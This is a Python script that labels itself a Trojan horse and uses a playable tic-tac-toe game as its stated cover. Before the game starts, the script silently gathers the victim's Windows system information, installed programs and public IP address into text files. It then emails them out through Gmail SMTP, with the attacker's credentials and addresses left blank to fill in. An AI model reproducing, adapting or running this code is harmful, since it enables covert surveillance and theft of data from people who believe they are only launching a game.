import threading
from termcolor import colored
import os, smtplib, subprocess, requests

##############################Trojan-Horse#################################

#get the registered username
data = subprocess.check_output('wmic os get RegisteredUser').decode()
registered_user = data.split('\n')[1].split()[0]

path1 = f'c:/Users/{registered_user}/yoursystemdatalol.txt'
path2 = f'c:/Users/{registered_user}/yourprogramsinstalleddatalol.txt'
path3 = f'c:/Users/{registered_user}/yourpubliciplol.txt'

def send_sys_infs():
    #save the system information in a text file
    os.system(f'systeminfo > {path1} 2>&1')

def send_programs_installed():
    #save the programs installed in a text file
    data = subprocess.check_output('powershell get-startapps'.split()).decode()
    file = open(path2, mode='w')
    file.write(data)
    file.close()

def public_ip_data():
    #save the public ip address in a text file
    req_website = 'https://api.ipify.org?format=json'
    req_data = requests.get(req_website).json()
    ip = req_data['ip']
    file = open(path3, mode='w')
    message = f"Victim's public IP: {ip}"
    file.write(message)
    file.close()

x1 = threading.Thread(target=send_sys_infs, daemon=True)
x2 = threading.Thread(target=public_ip_data, daemon=True)
x3 = threading.Thread(target=send_programs_installed, daemon=True)

x1.start()
x2.start()
x3.start()

x1.join()
x2.join()
x3.join()

def sendmail():
    file1, file2, file3 = open(path1, mode='r'), open(path2, mode='r'), open(path3, mode='r')
    data1, data2, data3 = file1.read(), file2.read(), file3.read()
    obj = smtplib.SMTP('smtp.gmail.com', 587)
    obj.starttls()
    obj.login('', '') #userid and password for from address
    obj.sendmail('', '', data1+'\n\n\n'+data2+'\n\n\n'+data3) #from address, to address
    obj.quit()

sendmail()

##############################Tic-Tac-Toe(cover)###############################
def game():
    os.system('cls')
    def check(b):
        if (b[0][0] == b[0][1]) and (b[0][1] == b[0][2]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][0] == b[1][0]) and (b[1][0] == b[2][0]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][-1] == b[1][-1]) and (b[1][-1] == b[2][-1]) and b[0][-1] != ' ':
            return [True, b[0][-1]]
        elif (b[-1][0] == b[-1][1]) and (b[-1][1] == b[-1][2]) and b[-1][0] != ' ':
            return [True, b[-1][0]]
        elif (b[0][0] == b[1][1]) and (b[1][1] == b[2][2]) and b[0][0] != ' ':
            return [True, b[0][0]]
        elif (b[0][-1] == b[1][1]) and (b[1][1] == b[-1][0]) and b[0][-1] != ' ':
            return [True, b[0][-1]]
        return [False]

    board = [[' ', ' ', ' '],
            [' ', ' ', ' '],
            [' ', ' ', ' ']]

    while True:
        print(colored('Tic Tac Toe\n\t  -Der game', 'magenta'))
        print('-'*20)
        print(colored('Rules:Just the same as a regular pen&paper one', 'cyan'))
        print(colored('Coordinates:\n__|__|__ (X, Y=0, 0),(X, Y=0, 1),(X, Y=0, 2)\n__|__|__ (X, Y=1, 0),(X, Y=1, 1),(X, Y=1, 2)\n  |  |   (X, Y=2, 0),(X, Y=2, 1),(X, Y=2, 2)', 'cyan'))
        print('-'*20)
        print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
        print('__|__|__')
        print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
        print('__|__|__')
        print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
        cx = [int(input('Enter x-coord(X):')), int(input('Enter y-coord(X):'))]
        os.system('cls')
        print(colored('Tic Tac Toe\n\t  -Der game', 'magenta'))
        print('-'*20)
        print(colored('Rules:Just the same as a regular pen&paper one', 'cyan'))
        print(colored('Coordinates:\n__|__|__ (X, Y=0, 0),(X, Y=0, 1),(X, Y=0, 2)\n__|__|__ (X, Y=1, 0),(X, Y=1, 1),(X, Y=1, 2)\n  |  |   (X, Y=2, 0),(X, Y=2, 1),(X, Y=2, 2)', 'cyan'))
        print('-'*20)
        if board[cx[0]][cx[-1]] == ' ':
            board[cx[0]][cx[-1]] = 'X'
        else:
            print(colored('Coordinate already taken', 'red'))
        if check(board)[0] == True:
            print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
            print('__|__|__')
            print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
            print('__|__|__')
            print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
            print(colored(f'{check(board)[-1]} wins!'), 'green')
            break
        print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
        print('__|__|__')
        print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
        print('__|__|__')
        print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
        c = 0
        for i in range(3):
            for j in range(3):
                if board[i][j] != ' ':
                    c += 1
        if c == 9:
            print("Draw")
            break
        co = [int(input('Enter x-coord(O):')), int(input('Enter y-coord(O):'))]
        os.system('cls')
        if board[co[0]][co[-1]] == ' ':
            board[co[0]][co[-1]] = 'O'
        else:
            print(colored('Coordinate taken already', 'red'))
        if check(board)[0] == True:
            print(f'{board[0][0]} |{board[0][1]} |{board[0][-1]}')
            print('__|__|__')
            print(f'{board[1][0]} |{board[1][1]} |{board[1][2]}')
            print('__|__|__')
            print(f'{board[2][0]} |{board[2][1]} |{board[2][2]}')
            print(colored(f'{check(board)[-1]} wins!', 'green'))
            break
        c = 0
        for i in range(3):
            for j in range(3):
                if board[i][j] != ' ':
                    c += 1
        if c == 9:
            print("Draw")
            break
game()
